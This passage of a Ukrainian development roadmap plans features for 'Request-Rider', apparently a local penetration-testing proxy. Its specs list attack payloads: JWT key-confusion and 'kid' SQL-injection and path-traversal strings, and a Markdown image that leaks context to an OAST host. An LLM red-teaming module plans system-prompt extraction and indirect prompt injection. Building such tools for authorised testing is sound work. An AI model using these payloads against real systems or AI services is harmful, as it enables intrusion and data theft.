  результати в Django, оновлювати project graph і повідомляти UI без блокування
  основного scan.
- Додати fixture-based tests без реальних зовнішніх credentials/API calls.

**Приймання:** entity та graph edges оновлюються повторювано, походження й
помилки збережені, секрети відсутні в логах, тести не звертаються до зовнішніх
мереж.

#### 4.3 Архітектурне рішення щодо Neo4j: відхилено на користь локальної БД

- Дослідження та оцінка: перехід на окрему графову СУБД Neo4j відхилено. Оскільки Request-Rider є автономним локальним інструментом тестувальника, введення важкої Java/JVM бази (Neo4j) призводить до невиправданого споживання оперативної пам'яті (від 1-2 ГБ лише під JVM) та ускладнює локальне розгортання.
- Рішення: поточна реляційна модель у локальній БД повністю покриває зв'язки сутностей OSINT/графа без додаткового оверхеду. Authoritative store лишається локальна БД.

### Фаза 5. Scripting та notifications

#### 5.1 Webhooks та notifications

- Моделі `Notification` у `web/lab/models.py` немає: створити Django
  notifications models/configuration для destination, event types, severity
  threshold, active state та пов’язаного Project. Webhook-тригер для workflows
  уже існує (`webhook_trigger`, `ALL /api/workflows/hooks/<slug>`) — потрібен
  саме вихідний канал для знахідок.
- Тригер — `ScannerRun.findings` (модель `Finding` видалена міграцією
  `0037_delete_finding.py`); порівнювати severity за фактичними полями nuclei
  findings.
- Створювати notification job лише після commit транзакції
  (`on_commit`/outbox), щоб не губити повідомлення й не надсилати їх для
  відкотених змін.
- Celery task надсилає JSON payload до налаштованого webhook; визначити формат,
  delivery status, retry policy, redaction, duplicate handling та історію помилок.
  Секрети destination зберігати безпечним способом і не логувати headers/token/body.
- Додати local fixture receiver для Slack/Telegram/Discord-сумісних payloads,
  unit/integration tests та UI керування після погодження UX.

**Приймання:** критична знахідка створює одну відтворювану async notification;
недоставка видима в журналі, чутливі поля редагуються, тести не звертаються до
зовнішніх мереж.

### Фаза 6. Automation до надійного DAG runtime

#### 6.2 Оркестрація, черга та відновлення

<!-- Registry node-екзекуторів, durable waiting state через EngineTaskDeferred та
     idempotent-відновлення за checkpoint реалізовані. Лишається: повне
     відновлення queued/running/waiting runs після рестарту web-процесу без
     позначення живих брокерних задач `interrupted`, і доведення цього тестом на
     реальному рестарті, а не на моках. -->

#### 6.3 Automation editor та дебаг-інструменти

- Вендорити React Flow як локальний бандл і підключити лише на canvas
  Automation. Без CDN, без зовнішніх fetch, без повного frontend build.
  **Статус 2026-10-16: не виконано** — `grep -c reactflow
  web/templates/lab/index.html` → 0, бандлу в `web/static/vendor/` немає.
- Зберегти node palette, connections, inspector, локалізацію, клавіатурну
  доступність та поточний API. Додати node run state, queued/waiting
  checkpoint, output/error inspector, retry/resume та **візуальну** execution
  timeline після готовності backend API. **Виміряно 2026-10-16:** стан вузлів
  зараз видно лише сирим JSON у панелі `workflow-log`
  (`web/templates/lab/index.html:24658`, `timeline: current.node_executions.map(...)`);
  візуального індикатора стану вузла на canvas, retry/resume кнопок та окремого
  інспектора output/error немає (`grep -n "nodeState|runState" web/templates/lab/index.html` → 0;
  `retry` є лише для перевірки engine в шапці та для Target).
- Перевірити draft/save/import/export, reload/persistence, branch display,
  SSE/reconnect та помилки на живому браузері; не змінювати наявні UI патерни
  поза потрібним Automation flow.

**Приймання:** оператор бачить для кожної ноди стан і безпечний JSON output,
може відрізнити помилку/очікування/завершення, а reload/reconnect не губить
стан виконання.

### Фаза 7. Завершення кожної ітерації

- Додавати targeted тести поряд зі зміненими модулями, міграційні тести на
  PostgreSQL, broker contract tests і failure/restart tests.
- Запускати застосливі перевірки з `AGENTS.md`: Django `check` і tests, Go
  `go test ./... -count=1` і `-race`, `git diff --check`; browser-facing зміни
  також перевіряти живим браузером, включно з console/network та persistence.
- Оновлювати україномовні `README.md`, відповідні довідники та
  `DEVELOPMENT_LOG.md`; не позначати пункт завершеним до проходження критеріїв.
- Дотримуватись «Гарбейж-колектор: прибирання мертвого»: усе, що завів ця
  ітерація і більше не працює, прибирається з доказом мертвості.

## Основні залежності

- Фаза 2.1 → 2.3: керована конкурентність задає каркас, у якому
  deadline-и отримують семантику checkpoint-ів (пасивну смугу 2.4 закрито 2026-09-29).
- Брокерна інфраструктура вже готова, тому 4.2 і 5.1 спираються на неї без
  додаткової роботи над чергою.
- DRF serializers можуть розроблятися окремою ітерацією; зовнішня публікація
  блокується до рішення з автентифікації.
- Neo4j — лише benchmark/decision після оптимізації та вимірювання PostgreSQL.
- React Flow підключається після того, як backend API для 6.3 буде готовий:
  інакше редактор отримає поля, яких ще немає в contract.

---

## ПРІОРИТИЗАЦІЯ ЗАВДАНЬ (оновлено 2026-10-26)

Пріоритизація побудована за інженерним принципом **Data Integrity & Runtime
Stability First**: не можна надбудовувати складні сканери, воркфлоу чи протоколи
над системою, де трафік різних проектів перемішується, горутини ризикують
підвиснути при затримках мережі, а профілі сканування є лише декоративними
текстовими метаданими.

### 🔴 РІВЕНЬ 1: БЛОКУЮЧИЙ ФУНДАМЕНТ (P0 — «ВПРОВАДЖУВАТИ ЗАРАЗ» / НАЙВИЩИЙ ПРІОРИТЕТ)

#### 1. Повний cancellation path та `context.WithTimeout` у Go Engine (Фаза 2.3)

- **Що зробити**: Гарантувати, що **кожна** функція, яка здійснює зовнішні
  мережеві запити, має контекст із дедлайном і коректно реагує на переривання
  клієнтом. Виміряно: `engine/osint_transforms.go` має **0** `WithTimeout`.
- **Чому зараз**: рушій може накопичувати підвислі горутини при «мовчазних» або
  повільних з'єднаннях цілі, блокуючи сокети та воркерів.
- **Ризик відкладання**: падіння продуктивності, споживання дескрипторів
  сокетів і неможливість гарантованого скасування завдань.

### 🟡 РІВЕНЬ 2: НАДІЙНІСТЬ РАНТАЙМУ ТА АНАЛІЗ (P1 — НАСТУПНИЙ КРОК)

#### 2. Clustering-based мутації та adaptive backoff у активному сканері

- **Що зробити**: кластеризація базових відповідей і мутації залежно від
  кластера; `429/503` з `Retry-After` → backoff.
- **Чому важливо**: без кластеризації мутації б'ють у порожнечі, а без backoff
  сканер отримує бан замість результату.

#### 3. Відновлення брокерних workflow-ранів після рестарту web-процесу (Фаза 6.2)

- **Що зробити**: не переводити живі брокерні задачі в `interrupted` лише
  через рестарт web, і довести це тестом на реальному рестарті.
- **Чому важливо**: робить можливими довгі ланцюжки (Recon → Scanner → Condition)
  без ризику втрати прогресу при оновленні чи перезапуску веб-сервера.

#### 4. Вихідні Webhook-сповіщення на знахідки ScannerRun (Фаза 5.1)

- **Що зробити**: `transaction.on_commit` + Celery-задача для JSON-пейлоадів у
  Slack/Telegram/вебхуки за порогом severity.

### 🟢 РІВЕНЬ 3: ПРОДУКТИВНІСТЬ ОПЕРАТОРА (P2)

#### 5. Repeater: режими перегляду Pretty / Raw

- **Що зробити**: швидкий перемикач між відформатованим поданням (Pretty для JSON, XML, HTML)
  та сирим байтовим потоком (Raw) у відповіді Repeater.
  (Hex-режим та вбудований visual diff знято за рішенням оператора: для порівняння є окрема вкладка Comparer).

### ⚪ РІВЕНЬ 4: СПЕЦІАЛІЗОВАНІ ПРОТОКОЛИ, ЛОКАЛЬНА AI ТА ЕКСПЕРИМЕНТИ (P3)

- **Нові відкриті пункти:**
  - **N1. Дворівнева локальна AI-архітектура (EmbeddingGemma 2 + Gemma 4 `e2b`/`e4b`)** — локальний он-деманд сенсор ембеддингів `embeddinggemma-2` (270M Text/Code, контекст 8K, MRL 128/256d) для детекції аномалій у Intruder, кластеризації в активному сканері, семантичної маршрутизації 546 скілів і тріажу JS AST у парі з компактною моделлю `gemma4:e2b` / `gemma4:e4b` як локальним ReAct-оператором (0 MB RAM у простої).
  - **N4. Бойовий тест MCP на локальних моделях Gemma 4 (`gemma4:e2b` / `gemma4:e4b`) через Ollama** — довести, що наш MCP-сервер реально керується локальною моделлю через stdio-протокол із попереднім семантичним відбором інструментів; артефакт — таблиця вимірів на ізольованому стенді.
- **Протокольні розширення**: WebSocket capture/replay, gRPC `.proto` introspection, H3/QUIC.
- **H2 single-packet experiment**: виконано як Last-Byte Sync
  (`engine/last_byte.go`); у backlog лишається лише deterministic one-TCP-packet
  semantics, якої інструмент не обіцяє.
- **OpenAPI/Postman імпорт та GraphQL інтроспекція**: конвертація
  API-специфікацій у граф атак.
- **Платні OSINT-інтеграції**: Shodan/Censys платні API (наразі відхилено на
  користь локальних та безкоштовних джерел).
- **Neo4j міграція**: відкладено до моменту, поки PostgreSQL справляється з
  навантаженням графів.

---

## Стратегічне розширення функціоналу: Топ-10 кілер-фіч проти Burp Suite, Caido та Postman (2026-10-28)

Цей розділ фіксує 10 нових інженерних можливостей, які спираються на вже наявний фундамент Request-Rider (Go-рушій на `:8081`, пасивний MITM-проксі на `:8080`, `browser-worker` на Playwright Firefox `:8090`, єдине сховище `Project` у PostgreSQL та візуальний DAG-оркестратор `Automation`) і закривають ключові слабкі місця Burp Suite Pro, Caido та Postman. Усі 10 фіч спроєктовані для автономної локальної роботи (loopback-only, single-user workstation) без зовнішніх хмарних залежностей, без CDN та з нульовим простоєм інтерфейсу (Zero-lag UI).

### Зведена матриця конкурентних переваг (F1–F10)

| Код | Назва фічі | Обмеження Burp Suite / Caido / Postman | Перевага реалізації в Request-Rider |
|---|---|---|---|
| **F1** | **Мульти-акторна матриця авторизації (`Live Auth Matrix / Native Autorize++`)** | Burp Autorize працює на повільному Jython і перевіряє лише 1 додаткову роль; Postman вимагає ручного перемикання Environments | Нативне паралельне дублювання запитів у Go-рушії для 3–5 ролей одночасно з авто-підтягуванням токенів із `ProjectSecret` та побудовою матриці `Endpoint × Role` |
| **F2** | **Інлайн-теги динамічної трансформації пейлоадів (`Live Request Macros`)** | У Caido/Postman потрібні важкі JS pre-request скрипти; у Burp Hackvertor гальмує при високошвидкісному фазингу | Компіляція вкладених тегів (`{{b64(...)}}`, `{{jwt_sign(...)}}`, `{{hmac_sha256(...)}}`) безпосередньо в Go перед записом у сокет — працює на повній швидкості навіть у `Repeater Burst` та `Last-Byte Sync` |
| **F3** | **Візуальний синхронізатор і хронограф гонок станів (`Race Condition Chronograph & Multi-Endpoint Barrier`)** | Відсутність мікросекундного таймлайну розльоту відповідей; складність синхронізації *різних* ендпоінтів в одному вікні гонки | Спільний бар'єр останнього байта (HTTP/1.1) або одного буфера (HTTP/2) для групи різних вкладок Повторювача + наочний SVG-хронограф TTFB/Jitter у реальному часі |
| **F4** | **Автоматичний генератор ланцюжків залежностей (`Stateful Traffic Auto-Chaining`)** | Ручне витягування CSRF/Session/Order ID між кроками в Postman (`pm.environment.set`) та складна конфігурація Session Macros у Burp | Автоматичний пошук потоку даних (`Set-Cookie`, JSON-ключів, заголовків) між обраними записами Історії/Трафіку з конвертацією в готовий зв'язаний граф `Automation` в 1 клік |
| **F5** | **Інтерактивна лабораторія атаки на JWT та крипто-токени (`JWT & Crypto Forge Studio`)** | Потреба у зовнішньому плагіні JWT Editor та ручному копіюванні публічних ключів сервера для атаки Key Confusion | Автоматичне зшивання зі знайденими у проєкті `/.well-known/jwks.json` та `ProjectSecret`, 1-клік мутації (`alg:none`, `RS256→HS256`, `kid` SQLi/Traversal, `jku` на локальний OAST) |
| **F6** | **Диференціальний монітор еволюції поверхні атаки (`Attack Surface Drift & Shadow API Radar`)** | Конкуренти працюють у межах «однієї поточної сесії» і не показують, що змінилося на цілі після нового релізу | Порівняння двох станів `Project` (`ProjectEndpoint`, `OsintGraph`, JS-хешів і клієнтських маршрутів): виявлення нових Shadow/Zombie API, нових параметрів і зниклих заголовків безпеки |
| **F7** | **Живий телеметричний міст клієнтського DOM (`Browser-Worker Live DOM Sink Telemetry`)** | Caido і Postman сліпі до клієнтського JS; Burp DOM Invader ізольований у вкладці браузера і не зв'язаний із графом автоматизації | Перехоплення викликів `eval`, `innerHTML`, `document.write`, `postMessage` у Playwright `browser-worker` через `add_init_script` із прямою прив'язкою JS-стектрейсу до рядка HTTP-трафіку |
| **F8** | **Спеціалізований модуль атак на AI/LLM-ендпоінти (`Target AI/LLM Red-Teaming Suite`)** | Повна відсутність спеціалізованих інструментів аудиту LLM/RAG/Agent API у класичних перехоплюючих проксі | Вбудований у Сканер та Інтрудер профіль за матрицею MITRE ATLAS (`AML.T0051` Direct/Indirect Prompt Injection через OAST, `AML.T0056` System Prompt Extraction, витік схем інструментів) |
| **F9** | **Інтелектуальний майнер прихованих параметрів (`Context-Aware Param Miner & Mass Assignment Prober`)** | Сліпий словниковий перебір десятків тисяч слів у Burp Param Miner, що займає хвилини на один ендпоінт | Пріоритезація кандидатів із уже спостережених JSON-полів відповідей проєкту (`is_admin`, `role`, `balance` → перевірка Mass Assignment) + `wappalyzergo`-специфічні параметри + бінарний пошук чанками у Go |
| **F10** | **Одноетапний компілятор відтворюваних PoC-експлойтів (`One-Click Reproducible PoC & Regression Packager`)** | Наявність лише примітивного `Copy as curl` або статичного звіту без автоматичної перевірки умови вразливості | Генерація самодостатнього Python / Go / Playwright експлойт-скрипту з вбудованим assertion доказу (`[VULNERABLE]` / `[PATCHED]`), який одразу слугує регресійним автотестом |

---

### Детальна інженерна специфікація фіч (F1–F10)

#### F1. Мульти-акторна матриця авторизації в реальному часі (`Live Auth Matrix / Native Autorize++`)

- [ ] Реалізувати паралельну матричну перевірку контролю доступу (BOLA / IDOR / BFLA) для кількох ролей на рівні Go-рушія та інтерфейсу Повторювача й Трафіку.

  **Інженерна суть та архітектура:**
  - **Модель даних (`web/lab/models.py`):** додати модель `ProjectAuthProfile` (прив'язану до `Project`), яка зберігає назву ролі (`Admin`, `Manager`, `User_A`, `User_B`, `Anonymous`), правила підстановки облікових даних (заголовки `Authorization`, `Cookie`, `X-API-Key` або пряме посилання на живий запис у `ProjectSecret`, який автоматично оновлюється при ротації токена).
  - **Go Engine (`engine/pkg/active/detect_business_logic.go`, `engine/main.go`):** новий ендпоінт `POST /api/repeater/auth-matrix`, який приймає базовий HTTP-запит та масив профілів ролей, виконує їх конкурентно через існуючий пул воркерів і повертає для кожної ролі: HTTP-статус, розмір відповіді, час, структурний JSON-відбиток (набір ключів) та вердикт порівняння з базовою відповіддю власника ресурсу (`ENFORCED`, `BYPASSED_IDENTICAL`, `BYPASSED_PARTIAL`, `ERROR`).
  - **UI (`web/templates/lab/tabs/_repeater.html`, `_traffic.html`):** компактна панель профілів ролей та таблиця матриці доступу (`Endpoint × Role`) з використанням існуючих семантичних токенів (`.status-badge`, `--danger`, `--accent`, `--warning`) без кольорової неоднозначності (кожен статус супроводжується текстовою міткою та іконкою).
  - **Критерії приймання:** перевірка 4 ролей на 1 ендпоінті виконується за один мережевий RTT у Go; клік по комірці матриці відкриває побайтове порівняння оригіналу та обраної ролі у вкладці `Порівнювач`; повне покриття тестами у `web/lab/test_auth_matrix.py` та `engine/pkg/active/detect_business_logic_test.go`.

---

#### F2. Інлайн-теги динамічної трансформації пейлоадів (`Live Request Macros / Hackvertor-style Tags`)

- [ ] Вбудувати препроцесор інлайн-макросів безпосередньо в конвеєр відправки Go-рушія для Повторювача, Інтрудера та вузлів Автоматизації.

  **Інженерна суть та архітектура:**
  - **Синтаксис та можливості:** підтримка вкладних виразів безпосередньо в сирому HTTP-запиті або заголовках:
    - Кодування та хешування: `{{b64(...)}}`, `{{b64url(...)}}`, `{{url_enc(...)}}`, `{{hex(...)}}`, `{{html_enc(...)}}`, `{{sha256(...)}}`, `{{md5(...)}}`, `{{hmac_sha256(key, data)}}`.
    - Динамічні генератори (окреме значення на кожен пакет): `{{uuid4()}}`, `{{ts_sec()}}`, `{{ts_ms()}}`, `{{rand_int(min, max)}}`, `{{rand_str(len)}}`, `{{nonce(16)}}`.
    - Інтеграція з `ProjectSecret`: `{{$secret.KEY_NAME}}` або `{{jwt_sign(header, payload, $secret.JWT_KEY)}}`.
  - **Go Engine (`engine/macro_eval.go`):** швидкий однопрохідний AST-парсер і обчислювач тегів на Go з рекурсивним розгортанням зсередини назовні (ліміт глибини вкладеності — 16 рівнів для захисту від циклів, перекривається явно). Обчислення відбувається для кожної ітерації окремо, що дозволяє генерувати унікальні `nonce`/`timestamp`/`HMAC` для кожного пакета в `Intruder`, `Repeater Burst` та `Last-Byte Sync`.
  - **Інваріант вікна RAW:** розмітка та геометрія вікон сирого запиту/відповіді не змінюються; у `ProjectExchange` зберігається як вихідний шаблон із тегами (для повторного редагування), так і фактично відправлений сирий байтовий потік (для доказової бази звіту).
  - **Критерії приймання:** 0 мс деградації в холостому режимі (коли тегів немає); підтримка у `POST /api/execute`, `Intruder`, `Repeater Burst` та `Last-Byte Sync`; юніт-тести `engine/macro_eval_test.go` на вкладені перетворення та граничні стани.

---

#### F3. Візуальний синхронізатор і хронограф гонок станів (`Race Condition Chronograph & Multi-Endpoint Barrier`)

- [ ] Винести можливості `Repeater Burst` та `Last-Byte Sync` у інтерактивний мульти-запитний інтерфейс Повторювача з візуальним SVG-хронографом мілісекундного таймінгу.

  **Інженерна суть та архітектура:**
  - **Мульти-ендпоінтний бар'єр (`engine/last_byte.go`, `engine/burst.go`):** розширити структуру запиту `LastByteSyncRequest` так, щоб вона приймала не лише $N$ копій одного запиту, а й **масив різних HTTP-запитів** (наприклад, Запит А: `POST /api/coupon/apply`, Запит Б: `POST /api/order/checkout`, Запит В: `POST /api/wallet/transfer`). Усі сокети відкриваються завчасно, проходять TLS-рукостискання, надсилають заголовки й тіло без останнього байта, стають на спільний `sync.WaitGroup` бар'єр у Go і вистрілюють останнім байтом (або одним HTTP/2 фреймом) одночасно.
  - **Телеметрія таймінгу:** для кожного сокета в пачці Go-рушій фіксує монотонні мітки часу (`t_connect_done`, `t_tls_done`, `t_last_byte_sent`, `t_first_byte_recv`, `t_done`) з точністю до мікросекунд і обчислює `Race Window Spread (µs)` — реальний розліт між найпершим і найостаннішим пакетом.
  - **UI Хронограф (`web/templates/lab/tabs/_repeater.html`):** у Повторювачі додається режим групової синхронізації робочих просторів та вбудований SVG-таймлайн (без жодних сторонніх chart-бібліотек), де кожен потік намальований горизонтальною смугою фаз, а відповіді з аномальним станом (наприклад, два успішні списання `200 OK` замість очікуваного `409 Conflict`) підсвічуються маркером потенційного Race Condition.
  - **Критерії приймання:** синхронна відправка різнорідних запитів через один бар'єр; відображення мікросекундного `Spread` у рядку стану; тести на локальному мульти-сокетному фікстурному сервері в `engine/last_byte_test.go`.

---

#### F4. Автоматичний генератор ланцюжків залежностей параметрів (`Stateful Traffic Correlation & Auto-Chaining`)

- [ ] Реалізувати автоматичний аналізатор потоку даних між записами `History`/`Traffic` з однокліковою генерацією готового параметризованого графа `Workflow` у вкладці Автоматизація.

  **Інженерна суть та архітектура:**
  - **Аналізатор кореляцій (`web/lab/traffic_chaining.py`):** оператор виділяє 2–15 послідовних обмінів у таблиці `Історія` або `Трафік` і обирає в контекстному меню `#ctx-menu` дію **«Побудувати ланцюжок в Automation»**. Модуль парсить відповіді ранніх запитів (`Set-Cookie`, заголовки `Location`/`X-CSRF-Token`, JSON-поля тіла, приховані `<input type="hidden">` форми) та шукає точні або URL/Base64-кодовані входження цих значень у наступних запитах (у query-параметрах, шляхах URL, заголовках `Authorization`/`Cookie` або JSON-тілі).
  - **Побудова DAG (`web/lab/workflow_engine.py`):** для кожного запиту створюється вузол `repeater`, між залежними вузлами автоматично проводяться ребра `edges`, а статичні значення токенів/ідентифікаторів у наступних вузлах замінюються на динамічні посилання контексту виконання (екстракція значення з попереднього вузла → підстановка в наступний).
  - **Критерії приймання:** ланцюжок `GET /login (отримання CSRF) → POST /login (отримання сесії) → POST /api/profile/update (використання сесії + dynamic ID)` розпізнається і перетворюється на валідний граф `Workflow` за 1 клік без ручного написання регулярних виразів; повне покриття в `web/lab/test_traffic_chaining.py`.

---

#### F5. Інтерактивна лабораторія атаки на JWT та крипто-токени (`JWT & Crypto Forge Studio`)

- [ ] Додати в `Декодер` та контекстне меню `Повторювача` інтерактивну студію модифікації та криптографічних атак на JWT/JWS-токени, інтегровану з `ProjectSecret` та локальним `OAST`.

  **Інженерна суть та архітектура:**
  - **Автоматичний контекст проєкту:** студія автоматично підтягує всі перехоплені в активному проєкті JWT-токени та секретні ключі з `ProjectSecret`, а також відкриті ключі RSA/ECDSA, знайдені модулем `detect_jwks.go` (`/.well-known/jwks.json`).
  - **Вектори мутацій в 1 клік (`engine/pkg/active/detect_jwt.go`, новий HTTP-хендлер у Go):**
    1. `None Algorithm Variants`: генерація 4 варіантів регістру (`none`, `None`, `NONE`, `nOnE`) з відсіканням підпису та збереженням крапки.
    2. `Key Confusion (RS256 → HS256)`: перетворення асиметричного алгоритму на симетричний HMAC із автоматичним підписуванням токена байти-в-байти публічним ключем сервера (PEM/DER/JWK), взятим із знахідок проєкту.
    3. `JWK Header Injection`: генерація нового локального RSA/EC ключа на льоту, підпис зміненого токена і вбудовування публічної частини безпосередньо в заголовок `jwk`.
    4. `JKU / X5U OAST & Local Spoofing`: підміна заголовка `jku`/`x5u` на URL нашого локального OAST-слухача з автоматичною роздачею підробленого `jwks.json`.
    5. `KID Injection Presets`: підстановка в поле `kid` векторів Path Traversal (`../../../../dev/null` з підписом порожнім рядком), SQL-ін'єкції (`' UNION SELECT 'secret'--`) та Command Injection.
    6. `Claim Tampering`: швидке редагування JSON-полей (`sub`, `role`, `is_admin`, продовження `exp` на +1 рік) із миттєвим перепідписом обраним секретом або відправкою всієї пачки мутацій у `Intruder`.
  - **Критерії приймання:** двосторонній зв'язок із `Повторювачем` («Відкрити токен у JWT Forge» → «Застосувати назад у запит»); тести всіх 6 векторів генерації у `engine/pkg/active/detect_jwt_test.go`.

---

#### F6. Диференціальний монітор еволюції поверхні атаки (`Attack Surface Drift & Shadow API Radar`)

- [ ] Реалізувати у `Knowledge Hub` проєкту та вкладці `Ціль` інструмент порівняння знімків поверхні атаки (Snapshots) для виявлення нових ендпоінтів, змінених JS-бандлів, Shadow API та регресій безпеки між прогонами.

  **Інженерна суть та архітектура:**
  - **Модель знімків (`web/lab/models.py`):** додати легковагову модель `ProjectSurfaceSnapshot`, яка фіксує незмінний (immutable) зріз стану проєкту на момент часу: список `ProjectEndpoint` (метод, шлях, параметри, статуси), версію `OsintGraph`, список клієнтських маршрутів і SHA-256 хеші зібраних JS-бандлів/SourceMaps, а також набір активних захисних заголовків (`CSP`, `HSTS`, `CORS`) та `identity_hash` знахідок сканера.
  - **Двигун порівняння (`web/lab/surface_drift.py`):** обчислює детермінований диф між двома знімками $S_1 \to S_2$:
    - `+ Нові ендпоінти` та **Shadow/Zombie API** (наприклад, коли поруч із відомим `/api/v2/users` у новому JS-бандлі або краулі засвітився `/api/v1/users` чи `/api/internal/export`);
    - `+ Нові параметри` на існуючих маршрутах (кандидати на першочерговий фазинг в `Intruder`);
    - `~ Змінені JS-файли` (де змінився хеш скрипта і з'явилися нові рядки URL/секретів);
    - `! Регресії авторизації та заголовків` (маршрут, що раніше віддавав `401/403`, почав віддавати `200`, або зник заголовок `Content-Security-Policy`).
  - **Інтеграція з Workflow:** після автоматичного запуску за розкладом (`schedule_trigger`) воркфлоу може автоматично створювати знімок і передавати лише *нові/змінені* ендпоінти на вхід вузла `scanner` (інкрементальне сканування дельти замість повного пересканування всього сайту).
  - **Критерії приймання:** створення і порівняння знімків у UI `Проєкти → Knowledge Hub`; можливість відправити лише дельту нових ендпоінтів у `Сканер` або `Ціль`; тести в `web/lab/test_surface_drift.py`.

---

#### F7. Живий телеметричний міст клієнтського DOM (`Browser-Worker Live DOM Sink & Event Telemetry`)

- [ ] Оснастити `browser-worker` (Playwright Firefox) системою перехоплення небезпечних клієнтських операцій у реальному часі з прямою прив'язкою JS-стектрейсів до HTTP-обмінів у `Трафіку` та `Цілі`.

  **Інженерна суть та архітектура:**
  - **Інструментація рантайму (`browser-worker/worker.py`, `web/lab/target_browser_js.py`):** перед навігацією сторінки у `BrowserContext` реєструється легковаговий `page.add_init_script()`, який перехоплює (monkey-patch без порушення роботи сторінки):
    - DOM-sink'и виконання коду та розмітки: `eval`, `Function`, `setTimeout`/`setInterval` (зі строковим аргументом), `Element.prototype.innerHTML` / `outerHTML`, `document.write` / `writeln`;
    - Навігаційні та міжвіконні канали: `window.postMessage`, обробники `addEventListener('message', ...)`, зміни `location.href` / `location.assign` / `location.replace`;
    - Чутливі сховища клієнта: читання/запис у `localStorage`, `sessionStorage` та `document.cookie`.
  - **Кореляція з мережею та канарками:** кожен перехоплений виклик фіксує значення аргументу, поточний URL, точний JS-стектрейс (`Error().stack` → файл, рядок, колонка) та ідентифікатор останнього `fetch`/`XHR` обміну. Якщо значення містить підрядок із параметрів запиту (навіть якщо спеціальні символи `< > "` були екрановані сервером і XSS ще не спрацював), подія позначається як **Tainted DOM Flow**.
  - **UI та прибирання ресурсів:** у інспекторі `Трафіку` та `Цілі` біля обміну з'являється бейдж `DOM Sinks (N)` із розгортанням стектрейсу. Дотримується суворе правило життєвого циклу: після завершення обходу контекст і процес браузера гарантовано закриваються (0 залишкових процесів `headless` у системі).
  - **Критерії приймання:** виявлення `postMessage`-приймачів та `innerHTML`-стоків на SPA-фікстурі з точним номером рядка скрипта; відсутність витоку процесів Firefox після прогону; тести в `web/lab/test_target_browser_js.py`.

---

#### F8. Спеціалізований модуль атак на AI/LLM-ендпоінти цілі (`Target AI/LLM Red-Teaming Suite`)

- [ ] Додати в `Активний сканер` та `Інтрудер` спеціалізований набір детекторів і пейлоадів для аудиту безпеки цільових AI-асистентів, RAG-систем та LLM API за класифікацією MITRE ATLAS.

  **Інженерна суть та архітектура:**
  - **Детектор у Go Engine (`engine/pkg/active/detect_llm_security.go`):** автоматично активується на ендпоінтах, що приймають текстові промпти (`prompt`, `message`, `query`, `chat`, `input`, `/v1/chat/completions`, `/api/chat`, `/rest/chatbot/*`) або за явним вибором профілю сканування:
    1. `AML.T0056 — System Prompt & Context Extraction`: серія багатомовних і структурних проб (переклад системних правил, форматування у JSON/YAML-блок, завершення системного тегу `</system>`, рольова інверсія) з евристичною перевіркою відповіді на ознаки витоку системної інструкції.
    2. `AML.T0051.001 — Indirect Prompt Injection & OAST Exfiltration`: перевірка здатності цільової LLM звертатися до зовнішніх ресурсів або рендерити небезпечний Markdown (`![img](http://<oast-host>/leak?ctx=...)` чи виклик web-browse tool на локальний OAST-слухач). Якщо приходить колбек на `OASTClient` — фіксується **Verified High/Critical** знахідка.
    3. `AML.T0051.002 — Agent Tool & Function Schema Disclosure`: зондування на витік внутрішніх JSON-схем підключених до цільової моделі інструментів (`functions`, `tools`, `mcp`, SQL-конекторів) та перевірка виконання несанкціонованих дій без підтвердження.
  - **Інтеграція зі звітами:** кожна знахідка отримує тег техніки MITRE ATLAS (`AML.T0051`, `AML.T0056`), повний транскрипт промпту/відповіді як доказ (`evidence`) та локалізовані українською/англійською рекомендації щодо захисту (input/output guardrails, ізоляція контексту RAG).
  - **Критерії приймання:** детекція витоку системного промпту та OAST-ексфільтрації через Markdown/tool-call на тестовій фікстурі; юніт-тести `engine/pkg/active/detect_llm_security_test.go`.

---

#### F9. Інтелектуальний майнер прихованих параметрів з контекстом проєкту (`Context-Aware Param Miner & Mass Assignment Prober`)

- [ ] Перетворити пошук прихованих параметрів у `engine/pkg/active/detect_hidden_params.go` та `Повторювачі` на контекстно-залежний інструмент виявлення Mass Assignment і незлінкованих полів із бінарним пошуком по батчах.

  **Інженерна суть та архітектура:**
  - **Трирівневе джерело кандидатів (замість сліпого словника):**
    1. **Пам'ять активного `Project` (`ProjectEndpoint` + `History`):** автоматичний збір усіх JSON-ключів, які сервер будь-коли повертав у відповідях `GET`-запитів цього проєкту (наприклад, `role`, `is_admin`, `is_staff`, `permissions`, `balance`, `discount`, `verified`, `org_id`, `internal_notes`), та імен параметрів із сусідніх маршрутів і JS AST (`target_sourcemap.go`).
    2. **Технологічний контекст (`wappalyzergo`):** підключення специфічних параметрів виявленого стеку (наприклад, `_method`, `debug`, `format`, `callback`, `fields`, `expand`, `include`, `__proto__`, `constructor`).
    3. **Базовий високоімовірний пул:** компактний ранжований словник чутливих параметрів.
  - **Алгоритм бінарного розбиття в Go (`engine/pkg/active/detect_hidden_params.go`):** кандидати пакуються батчами по 32–64 параметри в один HTTP-запит (у query string, `application/x-www-form-urlencoded` або JSON body залежно від `Content-Type`). Якщо батч змінює поведінку відповіді порівняно з baseline (статус, структура JSON, довжина за вирахуванням динамічних токенів, заголовки або час відповіді), Go-рушій автоматично ділить батч навпіл ($\log_2 N$ запитів) і знаходить точне ім'я параметра, яке спричинило аномалію.
  - **Критерії приймання:** виявлення прихованого параметра серед 512 кандидатів менш ніж за 20 HTTP-запитів; автоматичне виявлення Mass Assignment (коли поле з `GET`-відповіді приймається у `POST/PUT/PATCH`); тести `engine/pkg/active/detect_hidden_params_test.go`.

---

#### F10. Одноетапний компілятор відтворюваних PoC-експлойтів (`One-Click Reproducible PoC & Regression Packager`)

- [ ] Додати у `Сканер`, `Повторювач` та `Автоматизацію` генератор автономних виконуваних PoC-скриптів (Python 3 stdlib, Go, Playwright, `curl`), які відтворюють вразливість і автоматично перевіряють умову її наявності.

  **Інженерна суть та архітектура:**
  - **Модуль кодогенерації (`web/lab/poc_generator.py`):** приймає або окремий HTTP-обмін із `Повторювача`/`Історії`, або підтверджену знахідку з `ScannerRun.findings`, або ланцюжок вузлів `Workflow`, і генерує готовий до запуску файл у 4 форматах:
    1. **Python 3 (`urllib` / `http.client` — Zero-Dependency):** не вимагає `pip install`, підтримує кукі-сесії, кастомні заголовки, TLS без перевірки сертифіката, витягування проміжних токенів (якщо це ланцюжок) та містить блок автоматичної верифікації (`assert` на статус-код, присутність маркера доказу в тілі, дельту часу для time-based ін'єкцій або перевірку OAST) з виводом `[+] VULNERABLE: <title>` (exit code `0`) або `[-] NOT REPRODUCED / PATCHED` (exit code `1`).
    2. **Python + Playwright (для клієнтських XSS / DOM / CSRF знахідок):** готовий скрипт браузерного відтворення з авто-закриттям браузера у блоці `finally`.
